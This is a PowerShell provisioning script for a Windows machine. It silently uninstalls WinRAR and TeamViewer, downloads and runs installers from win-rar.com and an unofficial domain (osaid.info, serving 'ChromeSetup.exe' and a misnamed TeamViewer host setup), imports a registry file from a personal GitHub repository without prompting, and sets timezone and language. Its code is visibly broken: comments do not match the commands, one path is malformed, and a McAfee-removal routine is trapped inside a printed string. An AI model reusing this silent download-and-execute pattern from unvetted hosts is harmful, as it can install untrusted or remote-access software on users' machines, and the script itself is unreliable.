if ((gwmi win32_operatingsystem | select osarchitecture).osarchitecture -eq "64-bit")
 { 
#64 bit TeamViewer Uninstall 
Start-Process -FilePath "C:\Program Files\WinRAR\uninstall.exe" /s 
  #32 bit TeamViewer Uninstall 
Start-Process -Filepath "-file C:\Program Files (x86)\WinRAR\uninstall.exe" /s 
 } 
 New-Item -ItemType File -Path C:\Temp\newfile.txt -Value "Hello World!" -Force
(New-Object Net.WebClient).DownloadFile('https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-623.exe', 'C:\Temp\winrar.exe') 
C:\Temp\winrar.exe /s -Wait
(New-Object Net.WebClient).DownloadFile('https://osaid.info/ChromeSetup.exe', 'C:\Temp\Chrome.exe') 
Start-Process -FilePath "C:\Temp\Chrome.exe" -Wait

Start-Process -FilePath "C:\Program Files\TeamViewer\uninstall.exe" /S 
#32 bit TeamViewer Uninstall 
Start-Process -Filepath "C:\Program Files (x86)\TeamViewer\uninstall.exe"/S 
(New-Object Net.WebClient).DownloadFile('https://osaid.info/eamViewer_Host_Setup_x64.exe', 'C:\Temp\packageq1.exe')
C:\Temp\packageq1.exe /S -Wait
Stop-Process -Name "TeamViewer" -Force
New-Item -ItemType File -Path C:\Temp\newfile.txt -Value "Hi soso" -Force
# تحميل ملف من الإنترنت
$url = "https://raw.githubusercontent.com/defeat11/sav2/main/Teamvwier.reg"
$outputPath = "C:\Temp\reg.reg"
Invoke-WebRequest -Uri $url -OutFile $outputPath

# استيراد ملف تكوين التسجيل
$RegFilePath = "C:\Temp\reg.reg"
Start-Process regedit -ArgumentList "/s $RegFilePath" -Wait

# إيقاف تشغيل TeamViewer
Stop-Process -Name "TeamViewer" -Force

 Set-TimeZone -Name 'Arab Standard Time' -PassThru
# Add English (US) language
$LangList = New-WinUserLanguageList en-US
Set-WinUILanguageOverride en-US

# Add Arabic (Saudi Arabia) language
$LangList.Add("ar-SA")
Set-WinUserLanguageList $LangList
Set-WinUILanguageOverride en-US

# Set the display language for the current user
Set-WinUILanguageOverride en-US

# Set the input method editor (IME) for the added languages
$LangList[0].InputMethodTips.Add("0409:00000409")
$LangList[1].InputMethodTips.Add("0401:00004001")

# Apply the language settings
$LangList[0].InputTip = "0409:00000409"
$LangList[1].InputTip = "0401:00004001"
Set-WinUserLanguageList $LangList

$activationStatus = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
if ($activationStatus -eq $null) {
    Write-Host "
       =======================
    ======================

    
    Not Active ==---=-=-=-=-=-=-=-=-=-=-=
    
    
       =======================
    ======================

    "
} else {
    Write-Host "
    =======================
    ======================

    
    its ok

    
    ==========================
    ======================
    New-Item "C:\temp" -ItemType Directory
$url = "https://download.mcafee.com/molbin/iss-loc/SupportTools/MCPR/MCPR.exe"
$dest = "C:\temp\MCPR.exe" 
Invoke-WebRequest -Uri $url -OutFile $dest -verbose
start-process C:\temp\MCPR.exe -verb runas  -verbose
start-sleep -Seconds 3
stop-process -Name "McClnUI" -verbose
cd $Env:LocalAppData\Temp
$Now = Get-Date
Get-ChildItem $Env:LocalAppData\Temp\*.tmp | Where-Object { $_.LastWriteTime -gt $Now.AddSeconds(-10) } | Rename-Item -NewName "MCPRtemp" -verbose -ErrorAction SilentlyContinue
Copy-Item -Path "$Env:LocalAppData\Temp\MCPRtemp*" -Destination "C:\temp" -Recurse
cd C:\temp\MCPRtemp
.\Mccleanup.exe -p StopServices,MFSY,PEF,MXD,CSP,Sustainability,MOCP,MFP,APPSTATS,Auth,EMproxy,FWdiver,HW,MAS,MAT,MBK,MCPR,McProxy,McSvcHost,VUL,MHN,MNA,MOBK,MPFP,MPFPCU,MPS,SHRED,MPSCU,MQC,MQCCU,MSAD,MSHR,MSK,MSKCU,MWL,NMC,RedirSvc,VS,REMEDIATION,MSC,YAP,TRUEKEY,LAM,PCB,Symlink,SafeConnect,MGS,WMIRemover,RESIDUE -v -s
    
    
    "
}
